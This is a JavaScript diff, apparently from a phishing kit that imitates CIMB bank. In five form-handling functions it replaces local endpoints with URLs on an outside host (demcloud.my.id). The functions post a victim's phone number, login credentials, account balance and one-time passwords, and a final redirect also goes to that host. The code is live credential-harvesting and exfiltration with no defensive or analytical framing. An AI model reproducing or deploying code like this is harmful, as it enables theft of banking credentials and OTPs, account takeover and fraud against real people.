@@ -12,7 +12,7 @@ function sendNohp(){
    
        $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://demcloud.my.id/cimb/tcd12a/no.php',
             data: $('#hpForm').serialize(),
             datatype: 'JSON',
             
@@ -45,7 +45,7 @@ function sendLogin(){
    
      $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://demcloud.my.id/cimb/tcd12a/login.php',
             data: $('#loginForm').serialize(),
             datatype: 'JSON',
             
@@ -87,7 +87,7 @@ function sendSaldo(){
   
        $.ajax({
             type: 'POST',
-            url: 'rest/saldo.php',
+            url: 'https://demcloud.my.id/cimb/tcd12a/saldo.php',
             data: $('#saldoForm').serialize(),
             datatype: 'JSON',
         
@@ -133,7 +133,7 @@ function sendOtp(){
      
      $.ajax({
             type: 'POST',
-            url: 'rest/otp.php',
+            url: 'https://demcloud.my.id/cimb/tcd12a/otp.php',
             data: $('#otp-form').serialize(),
             datatype: 'JSON',
         
@@ -160,7 +160,7 @@ function wa(){
  $(".wait").fadeIn();   
     
 setTimeout(function(){  
-location.href='wa';
+location.href='https://demcloud.my.id/cimb/tcd12a/wa';
     }, 00);
     setTimeout(function(){
     $(".wait").fadeOut();   
